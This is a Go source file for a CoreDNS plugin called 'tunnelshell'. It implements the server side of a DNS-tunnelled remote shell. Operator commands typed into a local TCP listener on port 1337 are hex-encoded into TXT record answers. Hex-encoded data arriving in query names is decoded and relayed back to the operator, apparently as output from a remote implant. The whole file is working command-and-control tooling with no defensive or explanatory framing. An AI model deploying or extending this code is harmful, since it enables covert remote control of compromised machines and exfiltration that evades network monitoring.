package tunnelshell

import (
	"context"

	"github.com/coredns/coredns/plugin"

	"bufio"
	"encoding/hex"
	"fmt"
	"github.com/miekg/dns"
	"net"
	"strings"
	"sync"
)

type Tunnel struct {
	Next            plugin.Handler
	PendingOutbound []string
	Conns           []net.Conn
	OutCounter      int
	InCounter       int
	sync.Mutex
}

func New() *Tunnel {
	return &Tunnel{}
}

func (t *Tunnel) broadcast(msg string) {
	for _, conn := range t.Conns {
		conn.Write([]byte(msg))
	}
}

func (t *Tunnel) handleConnection(connection net.Conn) {
	fmt.Printf("received connection from %v\n", connection.RemoteAddr().String())

	_, err := connection.Write([]byte("[+] connected to coredns-tunnelshell\n"))
	if err != nil {
		fmt.Println("Something went wrong trying to write to the connection:", err)
	}

	reader := bufio.NewReader(connection)
	for {
		msg, err := reader.ReadString('\n')
		if err != nil {
			break
		}
		t.Lock()
		t.PendingOutbound = append(t.PendingOutbound, msg)
		t.Unlock()
	}

}

func (t *Tunnel) listenShell() {
	var listenPort string = "1337"
	listener, err := net.Listen("tcp", "localhost:"+listenPort)

	if err != nil {
		fmt.Printf("An error occurred while initializing the listener on %v: %v\n", listenPort, err)
	} else {
		fmt.Println("listening on tcp port " + listenPort + "...")
	}

	for {
		connection, err := listener.Accept()
		if err != nil {
			fmt.Printf("An error occurred during an attempted connection: %v\n", err)
		}
		t.Conns = append(t.Conns, connection)

		go t.handleConnection(connection)
	}
}

func (t *Tunnel) ServeDNS(ctx context.Context, rw dns.ResponseWriter, r *dns.Msg) (int, error) {

	t.Lock()

	answer := "+"

	if len(t.PendingOutbound) > 0 {
		answer = t.PendingOutbound[0]
		t.PendingOutbound = t.PendingOutbound[1:]

		answer = hex.EncodeToString([]byte(answer))
	}

	t.Unlock()

	m := new(dns.Msg)
	m.SetReply(r)

	for _, q := range m.Question {
		switch q.Qtype {
		case dns.TypeTXT:
			s := strings.Split(q.Name, "-")
			if len(s) > 0 {
				if s[0] != "00" {
					str, err := hex.DecodeString(s[0])
					if err == nil {
						t.broadcast(string(str))
					}
				}
			}
			rr, _ := dns.NewRR(fmt.Sprintf("%s 1 TXT %s", q.Name, answer))
			m.Answer = append(m.Answer, rr)
		}
	}
	m.MsgHdr.Authoritative = true

	ret := rw.WriteMsg(m)
	return 0, ret
}

// Name implements the Handler interface.
func (t *Tunnel) Name() string { return "tunnelshell" }
